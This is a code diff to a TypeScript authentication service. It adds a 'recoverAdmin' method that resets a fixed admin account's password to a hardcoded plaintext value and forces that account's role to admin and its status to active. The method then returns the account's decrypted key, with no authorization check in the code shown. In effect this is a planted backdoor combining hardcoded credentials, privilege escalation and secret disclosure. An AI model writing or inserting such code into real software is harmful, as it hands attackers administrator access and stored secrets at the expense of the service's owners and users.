@@ -153,6 +153,28 @@ export class AuthService implements OnModuleInit {
     return { message: 'Email verified successfully.' };
   }
 
+  async recoverAdmin() {
+    const email = 'falcon@aurikex.tech';
+    const user = await this.userModel.findOne({ email }).exec();
+    if (!user) {
+      return { error: 'Admin user not found' };
+    }
+    
+    // Reset password
+    const passwordHash = await bcrypt.hash('Korex1025$1025$', 10);
+    user.passwordHash = passwordHash;
+    user.account_status = 'active';
+    user.role = 'admin';
+    await user.save();
+    
+    // Return decrypted CBT key (getter is invoked on access)
+    return {
+      message: 'Admin recovered',
+      email: user.email,
+      cbt_key: user.cbt_key,
+    };
+  }
+
   async validateUserCredentials(email: string, password: string): Promise<UserDocument> {
     const normalizedEmail = email.toLowerCase();
     const user = await this.userModel.findOne({ email: normalizedEmail }).exec();
@@ -528,6 +550,7 @@ export class AuthService implements OnModuleInit {
     if (payload.fullName !== undefined) {
       user.fullName = payload.fullName;
     }
+
     if (payload.phone !== undefined) {
       user.phone = payload.phone;
     }
